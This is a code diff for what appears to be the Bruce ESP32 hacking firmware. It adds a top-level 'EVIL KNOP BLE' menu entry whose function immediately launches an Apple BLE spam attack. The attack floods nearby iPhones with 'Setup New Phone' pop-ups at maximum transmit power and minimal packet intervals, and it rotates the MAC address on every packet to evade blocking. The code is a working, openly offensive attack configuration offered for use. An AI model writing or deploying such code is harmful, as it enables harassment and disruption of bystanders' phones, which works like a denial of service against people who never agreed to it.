@@ -1,0 +1,97 @@
+diff --git a/include/MenuItemInterface.h b/include/MenuItemInterface.h
+index aa504f8..afa7160 100644
+--- a/include/MenuItemInterface.h
++++ b/include/MenuItemInterface.h
+@@ -102,11 +102,13 @@ public:
+         tft.drawPixel(0, 0, 0);
+         tft.fillRect(arrowAreaX, titleY, tftWidth - 2 * arrowAreaX, LH * FM, bruceConfig.bgColor);
+         int nchars = (tftWidth - 16) / (LW * FM);
++        tft.setTextColor(_titleColor ? _titleColor : bruceConfig.priColor, bruceConfig.bgColor);
+         tft.drawCentreString(getName().substring(0, nchars), iconCenterX, titleY, 1);
+     }
+ 
+ protected:
+     const char *_name = "";
++    uint16_t _titleColor = 0;
+     uint8_t rotation = ROTATION;
+ 
+     int iconAreaH =
+diff --git a/src/core/main_menu.cpp b/src/core/main_menu.cpp
+index 55a5878..2c47be8 100644
+--- a/src/core/main_menu.cpp
++++ b/src/core/main_menu.cpp
+@@ -5,6 +5,7 @@
+ 
+ MainMenu::MainMenu() {
+     _menuItems = {
++        &evilKnopBleMenu,
+         &wifiMenu,
+         &bleMenu,
+         &rfMenu,
+diff --git a/src/core/main_menu.h b/src/core/main_menu.h
+index 705e967..04b42a0 100644
+--- a/src/core/main_menu.h
++++ b/src/core/main_menu.h
+@@ -8,6 +8,7 @@
+ #include "menu_items/ConfigMenu.h"
+ #include "menu_items/ConnectMenu.h"
+ #include "menu_items/EthernetMenu.h"
++#include "menu_items/EvilKnopBleMenu.h"
+ #include "menu_items/FMMenu.h"
+ #include "menu_items/FileMenu.h"
+ #include "menu_items/GpsMenu.h"
+@@ -26,6 +27,7 @@ public:
+     ClockMenu clockMenu;
+     ConnectMenu connectMenu;
+     ConfigMenu configMenu;
++    EvilKnopBleMenu evilKnopBleMenu;
+     FMMenu fmMenu;
+     GpsMenu gpsMenu;
+     IRMenu irMenu;
+diff --git a/src/modules/ble/ble_spam.cpp b/src/modules/ble/ble_spam.cpp
+index b648388..85d8fb5 100644
+--- a/src/modules/ble/ble_spam.cpp
++++ b/src/modules/ble/ble_spam.cpp
+@@ -2256,3 +2256,29 @@ static void bleSpamMenuUi() {
+ }
+ 
+ void spamMenu() { bleSpamMenuUi(); }
++
++// EVIL KNOP BLE - immediate max-power Apple Action spam ("Setup New Phone" popups)
++// Launches the strongest iPhone BLE barrage right away. Stops on ESC press.
++void evilKnopBleRun() {
++    BleSpamConfig config;
++    config.adv_ms = 3;                     // minimal advertisement interval for max packet rate
++    config.gap_ms = 3;                     // minimal gap between packets
++    config.tx_power = BLE_SPAM_TX_MAX;     // full transmit power
++    config.mac_rand_mode = BLE_SPAM_MAC_EVERY_PACKET; // fresh MAC every packet
++
++    BleSpamSelection selection;
++    selection.attack_type = BLE_SPAM_ATTACK_APPLE_ACTION;
++    selection.device_index = 1; // "Setup New Phone" (0 = Apple TV Setup, 1 = Setup New Phone)
++
++    // Draw a dedicated red-tinted banner so the user knows what launched
++    drawMainBorderWithTitle("EVIL KNOP BLE");
++    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
++    tft.setTextSize(FP);
++    tft.drawCentreString("ATTACK: Setup New Phone", tftWidth / 2, tftHeight / 2 - LH, 1);
++    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
++    tft.drawCentreString("iPhone BLE Spam @ MAX", tftWidth / 2, tftHeight / 2 + LH, 1);
++    tft.drawCentreString("Press ESC to stop", tftWidth / 2, tftHeight - 20, 1);
++    vTaskDelay(pdMS_TO_TICKS(1200));
++
++    bleSpamRunScreen(selection, config);
++}
+diff --git a/src/modules/ble/ble_spam.h b/src/modules/ble/ble_spam.h
+index 4c2784f..499b623 100644
+--- a/src/modules/ble/ble_spam.h
++++ b/src/modules/ble/ble_spam.h
+@@ -7,6 +7,8 @@
+ #include <NimBLEUtils.h>
+ void spamMenu();
+ 
++void evilKnopBleRun();
++
+ void ibeacon(
+     const char *DeviceName = "Bruce iBeacon", const char *BEACON_UUID = "8ec76ea3-6668-48da-9866-75be8bc86f4d",
+     int ManufacturerId = 0x4C00
